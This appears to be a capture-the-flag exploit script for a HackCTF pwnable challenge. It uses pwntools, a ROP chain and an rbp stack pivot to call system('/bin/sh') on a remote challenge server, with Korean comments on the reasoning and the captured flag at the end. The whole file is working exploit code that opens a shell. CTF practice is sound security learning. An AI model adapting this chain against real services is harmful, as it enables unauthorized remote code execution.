#! -*- coding:utf-8 -*-
from pwn import *

#p = process("./ue")
p = remote("ctf.j0n9hyun.xyz",3023)



#64비트 바이너리 
# 1회 출력 후 fgets로 0x40만큼 입력받는다. ret 까지의 거리는 0x10바이트. 
# gift 라는 함수가 있다. 시스템함수를 호출하는 부분이 있음. 
# /bin/sh 문자열을 찾거나 입력해야한다.  0x4007f8 문자열위치를 인자로 system 함수를 호출하더라. 
# 가젯들을 보니 rdx에 관여하는 가젯이 없더라 음.. 
# main 함수에서 fgets로 입력받는 부분을 활용해볼까. rbp를 기준으로 입력할 위치 주소를 가져오는데
# rbp-0x10 이니까 rbp 값을 변조한 상태로 저 부분을 호출하면 입력을 받지 않을까? 
# 그 다음에 ret 할때 시스템 함수로 보내면 쉘이 따질거같다. 
# 첫째 입력 후에 0x601098 주소에 있는 값으로 점프하려고 하는게 보인다. 여기부터 rtl을 다시 해야되는걸까? 
# 그러나 이대로 실행을 하면 rsp가 망가져서 제대로 호출이 안된다. 이런..
# 원인을 찾아보니, 우리가 입력을 받을 bss영역에 쓰기권한이 없어 시스템 함수 실행이 안되는거였다. 
# 쓰기권한이 있는 다른 고정주소 영역을 찾으면 될것같다.
# 에러가 나는 원인이 프로그램 루틴 중 0x600d00 영역에 쓰려고 하기 때문이다. 
# 내가 입력한 주소에서 -0x300 위치에 걸리니, 그 정도만 더해주면 될듯. 
# 널널하게 0x400 더해주자. 근데 또 bss 에서 삐꾸난다 ㅡㅡ  0x600 쯤 하니까 된다. 


fgets_plt = 0x400580
system = 0x04006cf
pop_rdi = 0x4007d3 # pop rdi ; ret
pop_rsi_r15 = 0x4007d1 # pop rsi  pop r15 ; ret
pop_rbp = 0x400630 # pop rbp ; ret
bin = 0x601080 + 0x600
main = 0x040074d
#main = 0x04006DC
csu_pop = 0x4007CA # 0 -> 1 -> 함수주소 -> rdx -> rsi -> rdi
csu_call = 0x4007B0

payload = "a"*0x18	#5개까지밖에 못넣는다. 
#payload += p64(pop_rdi) + p64(bin) + p64(pop_rsi_r15) + p64(8) + p64(8) +p64(fgets_plt)
payload += p64(pop_rbp) + p64(bin+0x10) + p64(main)


pause()


payload2 = "/bin/sh\x00"+"\x00"*(0x10)+p64(pop_rdi)+p64(bin)+p64(system)
#payload2 = "b"*0x40
p.sendlineafter("plt",payload)

sleep(0.5)
p.sendline(payload2)

p.interactive()

#HackCTF{dyn5tr_tr1ck_^_^}